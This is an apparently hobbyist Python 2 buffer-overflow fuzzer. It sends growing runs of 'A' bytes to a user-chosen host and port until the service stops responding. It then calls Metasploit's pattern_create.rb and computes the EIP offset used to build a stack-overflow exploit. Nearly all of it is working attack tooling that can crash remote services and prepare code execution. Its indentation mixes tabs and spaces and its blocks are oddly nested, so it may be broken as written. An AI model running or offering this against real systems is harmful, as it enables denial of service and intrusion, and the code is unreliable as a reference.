#!/usr/bin/python

# Simple Fuzzer v1.0
# Usage: simplefuzzer.py --target [TARGET] --port [PORT]
#
# Description:
# The script will start fuzzing the target starting with 100 bytes and increments by 100 bytes as well. Once it detecet a
# potintioal buffer overflow it will automaticly generate a random char payload based on number of bytes it sent before 
# crashing. Then you will need to set the payload to the target host inside a debugger to get the EIP value. Once you get 
# the EIP value a prompt will be ready to insert the EIP value (in hex) and get the exact offset.
#
# Notes:
# make sure pattern_create.rb is locate in /usr/share/metasploit-framework/tools/exploit/
# scripts will run on <= Python 2.7
# 
# Devoleped by Muhannad

import time
import socket
import argparse
import sys
import subprocess
import os

def main():
    print ('Simple Fuzzer v1.0')
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', help='Host IP to Target.', type=str, required=True)
    parser.add_argument('--port',help='Vulnerable port.', type=int, required=True)
    args = parser.parse_args()
    host = args.target
    port = args.port

   

    # Create an array of buffers, from 1 to 1000 elements, with increments of 100 bytes each.
    buff='A'
    # max number of buffers in the array
    max_buffer = 10000
    # initial value of the counter
    counter=0
    # increment value
    increment=100
    # Connection counter
    connected=False
    t = time.localtime()
    current_time = time.strftime("%H:%M:%S", t)


    print ('Starting Fuzzmap at ' + str(current_time))
    print ('Simple Fuzzer report for ' + str(host))
    
    while counter <= max_buffer:
    	buff= 'A' * counter
    	counter+=increment
        #print(len(buff))
	#for fuzz in buff: 
	try:
			try:
			   socket.setdefaulttimeout(5)		
			   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			   connect = s.connect((host, port))
			except socket.gaierror, e:
	      		   print "Address-related error connecting to server: %s" % e
			   sys.exit(1)
	    		except socket.error, e:
			   print ('[-] Unable to connect to ' + str(host) + ' ,make sure the target IP is listening on port ' + str(port) + "\n[-] Connection error: %s" % e)
			   sys.exit(1)		
			if (connected==False):
			   print ('[+] Connected to host successfully')
			   connected=True
			#s.sendall(bytes((fuzz), encoding='utf8'))
			   s.sendall(buff)
			   print('Fuzzing with %s bytes' % str(counter))
			   s.recv(1024)
			else:
			   s.sendall(buff)
			   print('Fuzzing with %s bytes' % str(counter))
			   s.recv(1024)
			if (counter >= max_buffer):		
				print ('[!] Failed to fuzz with %s' % (counter + increment) + '\nbuffer has reached maximum pissable bytes to fuzz, try to increase --max_buffer')
				sys.exit(1)
			else:
				None
	except socket.timeout:
			if (counter<=100):
			   print ('[!] Looks like the buffer has already been filled')
			   sys.exit(1)
			else:
			   print('\n[!] Possible overflow detected at %s bytes' % str(counter)) 
			   proc = subprocess.Popen(['cd /usr/share/metasploit-framework/tools/exploit/; ./pattern_create.rb -l %s' % str(counter)], stdout=subprocess.PIPE, 				   shell=True)
	 		   (pattern, err) = proc.communicate()
			   print ('[+] Payload= ' + pattern)

			   #if statment if value is wrong
			   while True:
				try:
				    locateOffset = raw_input('\n[*] Enter the value of the EIP : ')
				    locateOffset = locateOffset.decode("hex")  
				except ValueError:
       				    print("Sorry, I didn't understand that.")
        #better try again... Return to the start of the loop
       				    continue
    				else:
    		      	            locateOffset = locateOffset[::-1]
   			            offsetLocation = pattern.find(locateOffset, 0, len(pattern))
   			            print('\n[!] Exact match found at ' + str(offsetLocation) + '!')
			            break
	s.close()
	time.sleep(.5)


if __name__ == '__main__':
	try:
           main()
        except KeyboardInterrupt:
	   print ('\n')
           try:
               sys.exit(1)
           except SystemExit:
               os._exit(1)
